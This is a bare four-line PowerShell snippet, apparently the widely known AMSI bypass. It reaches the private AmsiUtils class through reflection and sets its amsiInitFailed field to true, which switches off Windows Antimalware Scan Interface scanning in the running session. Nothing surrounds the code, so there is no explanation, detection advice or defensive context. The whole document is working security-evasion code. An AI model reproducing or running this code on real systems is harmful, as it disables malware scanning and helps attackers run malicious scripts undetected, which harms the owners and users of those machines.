$a='System.Management.Automation.AmsiUtils'
$t=[Ref].Assembly.GetType($a)
$f=$t.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
